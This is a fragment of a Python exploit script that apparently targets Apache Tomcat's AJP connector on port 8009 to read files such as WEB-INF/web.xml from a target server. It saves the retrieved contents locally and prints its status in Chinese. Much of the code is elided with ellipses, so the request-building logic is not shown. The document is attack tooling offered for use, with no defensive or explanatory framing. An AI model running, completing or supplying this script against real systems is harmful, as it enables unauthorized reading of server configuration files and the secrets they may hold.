    ...
    def send_and_receive(self, socket, stream):
        while True:
            ...
            while (
                ...
                and r.prefix_code != AjpResponse.SEND_HEADERS
            ):
                r = AjpResponse.receive(stream)
...
class Tomcat(object):
    def __init__(self, target_host, target_port):
        ...
        self.stream = self.socket.makefile("rb")  # Removed bufsize argument

    def perform_request(
        self, req_uri, headers={}, method="GET", user=None, password=None, attributes=[]
    ):
        ...
        print(
            "Getting resource at ajp13://%s:%d%s"
...
parser.add_argument(
    "-p", "--port", type=int, default=8009, help="AJP port to attack (default is 8009)"
)
parser.add_argument(
    "-f",
    "--file",
    ...
    help="file path :(WEB-INF/web.xml)",
)
args = parser.parse_args()
print("-----------------------------------")
print("目标: " + args.target, "端口: " + str(args.port), "文件:" + args.file)
print("-----------------------------------")
...
with open(file_name, 'w', encoding='utf-8') as f:  
    f.write("".join([d.data.decode('utf-8') for d in data]))  